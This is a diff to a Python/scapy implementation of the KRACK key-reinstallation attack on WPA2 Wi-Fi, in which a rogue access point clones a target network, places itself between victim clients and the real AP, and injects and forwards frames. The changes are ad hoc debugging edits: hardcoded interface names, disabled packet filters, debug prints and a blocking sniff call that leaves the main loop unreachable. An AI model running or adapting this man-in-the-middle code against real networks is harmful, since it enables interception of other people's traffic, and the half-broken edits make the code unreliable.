@@ -12,6 +12,7 @@ from scapy.all import *
 import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, textwrap
 from datetime import datetime
 from wpaspy import Ctrl
+import select
 
 # Notes:
 # - This was tested using scapy 
@@ -84,7 +85,7 @@ class MitmSocket(L2Socket):
 	def send(self, p):
 		# Hack: set the More Data flag so we can detect injected frames
 		p[Dot11].FCfield |= 0x20
-		send(RadioTap()/p, iface=self.iface, verbose=False)
+		sendp(RadioTap()/p, iface=self.iface, verbose=False)
 		if self.pcap: self.pcap.write(RadioTap()/p)
 		log(DEBUG, "%s: Injected frame %s" % (self.iface, dot11_to_str(p)))
 
@@ -109,6 +110,7 @@ class MitmSocket(L2Socket):
 	def recv(self, x=MTU):
 		p = L2Socket.recv(self, x) #CS5321
 		if p == None or not Dot11 in p: return None
+		
 		if self.pcap: self.pcap.write(p)
 
 		# Don't care about control frames
@@ -279,7 +281,7 @@ def get_tlv_value(p, type):
 		if el.ID == type:
 			return el.info
 		el = el.payload
-	return None
+	return "-"
 
 
 #### Man-in-the-middle Code ####
@@ -656,11 +658,18 @@ class KRAckAttack():
 		if Dot11WEP in p and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
 			log(STATUS, "Got a likely group message 2", showtime=False)
 
-
+	def receive_packet(self, pkt):
+		if pkt.sniffed_on == self.sock_real.iface:
+			self.handle_rx_realchan2(pkt)
+		if pkt.sniffed_on == self.nic_rogue_mon:
+			self.handle_rx_roguechan2(pkt)
+	
 	def handle_rx_realchan(self):
 		p = self.sock_real.recv()
 		if p == None: return
+		self.handle_rx_realchan2(p)
 
+	def handle_rx_realchan2(self, p):
 		# 1. Handle frames sent TO the real AP
 		if p.addr1 == self.apmac:
 			# If it's an authentication to the real AP, always display it ...
@@ -683,23 +692,23 @@ class KRAckAttack():
 				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
 
 			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
-			elif Dot11Deauth in p or Dot11Disas in p:
-				print_rx(INFO, "Real channel ", p)
-				if p.addr2 in self.clients: del self.clients[p.addr2]
+			#elif Dot11Deauth in p or Dot11Disas in p:
+			#	print_rx(INFO, "Real channel ", p)
+			#	if p.addr2 in self.clients: del self.clients[p.addr2]
 
 			# Display all frames sent from a MitM'ed client
 			elif p.addr2 in self.clients:
-				print_rx(INFO, "Real channel ", p)
+				print_rx(INFO, "Real channel from MitM-ed client", p)
 
 			# For all other frames, only display them if they come from the targeted client
 			elif self.clientmac is not None and self.clientmac == p.addr2:
-				print_rx(INFO, "Real channel ", p)
+				print_rx(INFO, "Real channel from victim", p)
 
 
 			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
 			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
-				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))
+				sendp(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac), iface=self.sock_real.iface)
 
 
 		# 2. Handle frames sent BY the real AP
@@ -714,16 +723,17 @@ class KRAckAttack():
 
 			# Pay special attention to Deauth and Disassoc frames
 			if Dot11Deauth in p or Dot11Disas in p:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+				print_rx(INFO, "Real channel MitM", p, suffix=" -- MitM'ing" if might_forward else None)
 			# If targeting a specific client, display all frames it sends
 			elif self.clientmac is not None and self.clientmac == p.addr1:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+				print_rx(INFO, "Real channel MitM", p, suffix=" -- MitM'ing" if might_forward else None)
 			# For other clients, just display what might be forwarded
 			elif might_forward:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
+				print_rx(INFO, "Real channel MitM", p, suffix=" -- MitM'ing")
 
 			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
+				print "Forwarded some packets"
 				# Unicast frames to clients
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
@@ -737,32 +747,35 @@ class KRAckAttack():
 
 					elif Dot11Deauth in p:
 						del self.clients[p.addr1]
-						self.sock_rogue.send(p)
+						sendp(p, iface=self.sock_rogue.iface)
 
 					else:
-						self.sock_rogue.send(p)
+						sendp(p, iface=self.sock_rogue.iface)
 
 				# Group addressed frames
 				else:
-					self.sock_rogue.send(p)
+					sendp(p, iface=self.sock_rogue.iface)
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
 			print_rx(INFO, "Real channel ", p)
-
-
+	
 	def handle_rx_roguechan(self):
 		p = self.sock_rogue.recv()
-		if p == None: return
+		if p == None: 
+			return
+		self.handle_rx_roguechan2(p)
 
+	def handle_rx_roguechan2(self, p):
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
+				print "Comparing original vs fake beacon"
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p)
+				print_rx(INFO, "Rogue channel to victim", p)
 			# And display all frames sent to a MitM'ed client
 			elif p.addr1 in self.clients:
 				print_rx(INFO, "Rogue channel", p)
@@ -773,7 +786,7 @@ class KRAckAttack():
 
 			# Check if it's a new client that we can MitM
 			if Dot11Auth in p:
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				print_rx(INFO, "Rogue channel MitM-new", p, suffix=" -- MitM'ing")
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].mark_got_mitm()
 				client = self.clients[p.addr2]
@@ -782,7 +795,7 @@ class KRAckAttack():
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
 				will_forward = client.should_forward(p)
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
+				print_rx(INFO, "Rogue channel MitM", p, suffix=" -- MitM'ing" if will_forward else None)
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
 				print_rx(INFO, "Rogue channel", p)
@@ -851,7 +864,7 @@ class KRAckAttack():
 		subprocess.check_output(["ifconfig", self.nic_real, "down"])
 		subprocess.check_output(["iw", self.nic_real, "set", "type", "monitor"])
 		if self.nic_rogue_mon is None:
-			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
+			self.nic_rogue_mon = "fakeapmon"#self.nic_rogue_ap + "mon"
 			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
 			# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
 			# sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
@@ -878,8 +891,12 @@ class KRAckAttack():
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 
 	def run(self, strict_echo_test=False):
-		self.configure_interfaces()
-
+		#self.configure_interfaces()
+		#Override configuration
+		self.nic_rogue_mon = "wlx503eaa526d33"
+		self.nic_real_clientack = "wlp4s0"
+		self.nic_rogue_ap = "wlx503eaa527cb7"
+		
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
@@ -915,8 +932,8 @@ class KRAckAttack():
 		if self.clientmac:
 			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
 		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
-		self.sock_real.attach_filter(bpf)
-		self.sock_rogue.attach_filter(bpf)
+		#self.sock_real.attach_filter(bpf)
+		#self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("hostapd_rogue.conf", "w") as fp:
@@ -945,11 +962,23 @@ class KRAckAttack():
 		self.last_real_beacon = time.time()
 		self.last_rogue_beacon = time.time()
 		nextbeacon = time.time() + 0.01
+		
+		#View settings
+		print "sock_rogue : " + self.sock_rogue.iface
+		print "sock_real  : " + self.sock_real.iface
+		sniff(iface=[self.sock_rogue.iface, self.sock_real.iface], prn=self.receive_packet)
+		
 		while True:
 			sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
-			if self.sock_real      in sel[0]: self.handle_rx_realchan()
-			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
-			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
+			if self.sock_real      in sel[0]: 
+				self.handle_rx_realchan()
+				#print "Selected fake client -> real AP"
+			if self.sock_rogue     in sel[0]: 
+				self.handle_rx_roguechan()
+				print "Selected real client -> fake AP"
+			if self.hostapd.stdout in sel[0]: 
+				self.handle_hostapd_out()
+				#print "Selected hostapd socket"
 
 			if self.time_forward_group1 and self.time_forward_group1 <= time.time():
 				p = self.group1.pop(0)
